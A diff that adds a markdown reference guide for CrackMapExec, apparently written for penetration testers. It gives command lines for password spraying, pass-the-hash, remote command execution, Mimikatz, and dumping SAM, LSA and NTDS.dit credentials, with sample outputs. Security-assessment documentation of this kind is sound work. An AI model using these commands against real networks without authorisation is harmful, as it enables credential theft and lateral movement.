@@ -1,0 +1,357 @@
+---
+title: "CrackMapExec"
+description: "CrackMapExec tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['network', 'windows', 'active directory', 'post-exploitation']
+---
+
+**CrackMapExec (CME)** is an **open-source** post-exploitation tool that automates the assessment of large Active Directory networks. It is designed to help penetration testers perform reconnaissance, execute commands, dump credentials, and move laterally through Windows networks efficiently. CrackMapExec supports multiple protocols including SMB, WinRM, MSSQL, SSH, and LDAP, making it a versatile tool for network penetration testing.
+
+**Here are the primary uses of CrackMapExec:**
+
+  * **Network Reconnaissance:** CrackMapExec rapidly scans and enumerates Windows networks, identifying active hosts, SMB shares, logged-in users, and system information. It provides quick reconnaissance capabilities essential for understanding target network topology.
+
+  * **Credential Validation:** The tool validates credentials across multiple hosts simultaneously, identifying where specific credentials are valid and determining privilege levels. This capability helps security professionals understand credential reuse and privilege distribution across networks.
+
+  * **Lateral Movement:** CrackMapExec facilitates lateral movement through Windows networks by executing commands on multiple systems simultaneously, enabling efficient post-exploitation and demonstrating the impact of compromised credentials.
+
+  * **Credential Dumping:** The tool can extract credentials from multiple hosts including SAM database, LSA secrets, and NTDS.dit from domain controllers, providing comprehensive credential harvesting capabilities during security assessments.
+
+  * **Pass-the-Hash Attacks:** CrackMapExec natively supports pass-the-hash and pass-the-ticket attacks, allowing authentication using NTLM hashes or Kerberos tickets without knowing plaintext passwords.
+
+  * **Module System:** CrackMapExec features an extensible module system that adds specialized functionality for tasks like Mimikatz execution, bloodhound data collection, vulnerability scanning, and custom post-exploitation activities.
+
+
+
+
+## Core Features​
+
+  * Multi-Protocol Support (SMB, WinRM, MSSQL, SSH, LDAP)
+  * Credential Validation
+  * Command Execution
+  * Credential Dumping
+  * Pass-the-Hash Support
+  * Pass-the-Ticket Support
+  * Share Enumeration
+  * User Enumeration
+  * Group Enumeration
+  * BloodHound Integration
+  * Module System
+  * Database Storage
+  * Multi-Threading
+  * Spray Attacks
+
+
+
+## Data sources​
+
+  * SMB Protocol
+  * WinRM Protocol
+  * LDAP Queries
+  * MSSQL Databases
+  * Windows Registry
+  * SAM Database
+  * LSA Secrets
+  * NTDS.dit
+  * Active Directory
+  * Network Shares
+  * Logged Users
+  * Local Groups
+
+
+
+## Common CrackMapExec Commands​
+
+### 1\. Basic SMB Enumeration​
+
+  * This command performs basic SMB enumeration on a target host, identifying the operating system, domain, and SMB signing status.
+
+
+    
+    
+```
+crackmapexec smb <target>  
+```
+### 2\. Credential Validation​
+
+  * This command validates credentials against a target system, checking if the provided username and password combination is valid.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password>  
+```
+### 3\. Pass-the-Hash Authentication​
+
+  * This command authenticates using NTLM hash instead of plaintext password, enabling pass-the-hash attacks across the network.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -H <ntlm_hash>  
+```
+### 4\. Credential Spray Attack​
+
+  * This command tests a single password against multiple usernames from a file, useful for identifying users with weak or common passwords.
+
+
+    
+    
+```
+crackmapexec smb <target> -u users.txt -p <password>  
+```
+### 5\. Password Spray Attack​
+
+  * This command tests multiple passwords against multiple users, automating password spraying across the entire user base.
+
+
+    
+    
+```
+crackmapexec smb <target> -u users.txt -p passwords.txt  
+```
+### 6\. Execute Commands​
+
+  * This command executes a specified command on remote systems after successful authentication, providing remote code execution capabilities.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> -x "whoami"  
+```
+### 7\. Execute PowerShell Commands​
+
+  * This command executes PowerShell commands remotely on target systems, enabling more advanced post-exploitation activities.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> -X "Get-Process"  
+```
+### 8\. Dump SAM Database​
+
+  * This command extracts local user hashes from the SAM database on target systems, providing local credential access.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --sam  
+```
+### 9\. Dump LSA Secrets​
+
+  * This command extracts LSA secrets from target systems, revealing cached domain credentials and service account passwords.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --lsa  
+```
+### 10\. Dump NTDS.dit​
+
+  * This command extracts the NTDS.dit database from domain controllers, providing all domain user password hashes.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --ntds  
+```
+### 11\. Enumerate Shares​
+
+  * This command lists all available SMB shares on target systems, identifying accessible network resources.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --shares  
+```
+### 12\. Enumerate Logged Users​
+
+  * This command identifies currently logged-in users on target systems, useful for targeting specific user sessions.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --sessions  
+```
+### 13\. Enumerate Local Users​
+
+  * This command lists all local users on target systems, providing information about local account configurations.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --users  
+```
+### 14\. Enumerate Local Groups​
+
+  * This command enumerates local groups and their members on target systems, identifying administrative accounts.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> --groups  
+```
+### 15\. Enumerate Domain Users​
+
+  * This command queries Active Directory to enumerate all domain users, gathering comprehensive user information.
+
+
+    
+    
+```
+crackmapexec ldap <target> -u <username> -p <password> --users  
+```
+### 16\. Spider Shares​
+
+  * This command recursively searches SMB shares for files matching specific patterns, useful for locating sensitive data.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> -M spider_plus  
+```
+### 17\. Execute Mimikatz Module​
+
+  * This command executes Mimikatz on target systems to extract credentials from memory, providing plaintext passwords and hashes.
+
+
+    
+    
+```
+crackmapexec smb <target> -u <username> -p <password> -M mimikatz  
+```
+### 18\. BloodHound Data Collection​
+
+  * This command collects BloodHound data from Active Directory for graphical analysis of attack paths and relationships.
+
+
+    
+    
+```
+crackmapexec ldap <target> -u <username> -p <password> -M bloodhound  
+```
+### 19\. WinRM Command Execution​
+
+  * This command uses WinRM protocol for remote command execution, providing an alternative to SMB-based execution.
+
+
+    
+    
+```
+crackmapexec winrm <target> -u <username> -p <password> -x "hostname"  
+```
+### 20\. MSSQL Query Execution​
+
+  * This command executes SQL queries on MSSQL servers, useful for database enumeration and exploitation.
+
+
+    
+    
+```
+crackmapexec mssql <target> -u <username> -p <password> -q "SELECT @@version"  
+```
+### 21\. List Available Modules​
+
+  * This command displays all available modules that can be used with CrackMapExec for various post-exploitation tasks.
+
+
+    
+    
+```
+crackmapexec smb -L  
+```
+### 22\. Subnet Scanning​
+
+  * This command scans an entire subnet for accessible hosts, quickly identifying targets within a network range.
+
+
+    
+    
+```
+crackmapexec smb 192.168.1.0/24  
+```
+### 23\. Continue on Success​
+
+  * This command continues authentication attempts even after finding valid credentials, useful for identifying credential reuse.
+
+
+    
+    
+```
+crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success  
+```
+### 24\. Help and Usage Information​
+
+  * This command displays help information for CrackMapExec, showing available protocols, options, and usage examples.
+
+
+    
+    
+```
+crackmapexec -h  
+```
+Alternative usage:
+    
+    
+```
+crackmapexec --help  
+```
+## Output Examples of CrackMapExec Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Basic Enumeration| `crackmapexec smb 192.168.1.10`| Enumerates SMB information.| `SMB 192.168.1.10 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)`  
+Valid Credentials| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd`| Validates credentials.| `SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`  
+Invalid Credentials| `crackmapexec smb 192.168.1.10 -u admin -p WrongPass`| Tests invalid credentials.| `SMB 192.168.1.10 445 DC01 [-] CORP.LOCAL\admin:WrongPass STATUS_LOGON_FAILURE`  
+Pass-the-Hash| `crackmapexec smb 192.168.1.10 -u admin -H fc525c9683e8fe067095ba2ddc971889`| Authenticates with hash.| `SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\admin fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)`  
+Password Spray| `crackmapexec smb 192.168.1.10 -u users.txt -p Password123`| Sprays password across users.| `SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\john:Password123 `   
+` SMB 192.168.1.10 445 DC01 [-] CORP.LOCAL\jane:Password123 STATUS_LOGON_FAILURE`  
+Command Execution| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd -x whoami`| Executes command remotely.| `SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!) `   
+` SMB 192.168.1.10 445 DC01 corp\admin`  
+PowerShell Exec| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd -X "Get-Host"`| Executes PowerShell command.| `SMB 192.168.1.10 445 DC01 Name : ConsoleHost `   
+` Version : 5.1.17763.1007`  
+Dump SAM| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd --sam`| Dumps SAM database.| `SMB 192.168.1.10 445 DC01 [+] Dumping SAM hashes `   
+` Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`  
+Dump LSA| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd --lsa`| Extracts LSA secrets.| `SMB 192.168.1.10 445 DC01 [+] Dumping LSA secrets `   
+` CORP.LOCAL\svc_backup:$DCC2$10240#svc_backup#hash...`  
+Dump NTDS| `crackmapexec smb 192.168.1.1 -u admin -p P@ssw0rd --ntds`| Extracts domain hashes.| `SMB 192.168.1.1 445 DC01 [+] Dumping NTDS.dit `   
+` Administrator:500:aad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::`  
+Enumerate Shares| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd --shares`| Lists SMB shares.| `SMB 192.168.1.10 445 DC01 ADMIN$ Disk Remote Admin `   
+` SMB 192.168.1.10 445 DC01 C$ Disk Default share`  
+Logged Users| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd --sessions`| Shows logged-in users.| `SMB 192.168.1.10 445 DC01 CORP.LOCAL\john (Active: 2h 15m) `   
+` SMB 192.168.1.10 445 DC01 CORP.LOCAL\admin (Active: 45m)`  
+Local Users| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd --users`| Lists local users.| `SMB 192.168.1.10 445 DC01 Administrator `   
+` SMB 192.168.1.10 445 DC01 Guest`  
+Local Groups| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd --groups`| Lists local groups.| `SMB 192.168.1.10 445 DC01 Administrators `   
+` SMB 192.168.1.10 445 DC01 Remote Desktop Users`  
+Domain Users| `crackmapexec ldap 192.168.1.1 -u admin -p P@ssw0rd --users`| Enumerates AD users.| `LDAP 192.168.1.1 389 DC01 john.doe `   
+` LDAP 192.168.1.1 389 DC01 jane.smith`  
+Spider Module| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd -M spider_plus`| Spiders shares for files.| `SMB 192.168.1.10 445 DC01 [+] Found: \\192.168.1.10\Share\passwords.txt`  
+Mimikatz Module| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd -M mimikatz`| Executes Mimikatz.| `SMB 192.168.1.10 445 DC01 [+] john : P@ssw0rd123 `   
+` SMB 192.168.1.10 445 DC01 [+] admin : SuperSecret!`  
+BloodHound| `crackmapexec ldap 192.168.1.1 -u admin -p P@ssw0rd -M bloodhound`| Collects BloodHound data.| `LDAP 192.168.1.1 389 DC01 [+] Collecting data for BloodHound `   
+` LDAP 192.168.1.1 389 DC01 [+] Data saved to: bloodhound_data.zip`  
+WinRM Execution| `crackmapexec winrm 192.168.1.10 -u admin -p P@ssw0rd -x hostname`| Uses WinRM for execution.| `WINRM 192.168.1.10 5985 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!) `   
+` WINRM 192.168.1.10 5985 DC01 DC01`  
+MSSQL Query| `crackmapexec mssql 192.168.1.20 -u sa -p P@ssw0rd -q "SELECT @@version"`| Executes SQL query.| `MSSQL 192.168.1.20 1433 SQL01 Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`  
+List Modules| `crackmapexec smb -L`| Lists available modules.| `[*] mimikatz Executes Mimikatz `   
+` [*] spider_plus Spiders shares for files `   
+` [*] bloodhound Collects data for BloodHound`  
+Subnet Scan| `crackmapexec smb 192.168.1.0/24`| Scans entire subnet.| `SMB 192.168.1.10 445 DC01 [*] Windows 10.0 Build 17763 `   
+` SMB 192.168.1.20 445 SQL01 [*] Windows Server 2019`  
+Continue Success| `crackmapexec smb 192.168.1.10 -u users.txt -p Pass123 --continue-on-success`| Continues after success.| `SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\john:Pass123 `   
+` SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\jane:Pass123`  
+Admin Check| `crackmapexec smb 192.168.1.10 -u admin -p P@ssw0rd`| Checks for admin access.| `SMB 192.168.1.10 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`  
+Gen Relay List| `crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt`| Generates relay target list.| `[+] Generating relay list... `   
+` [+] 5 targets saved to targets.txt`
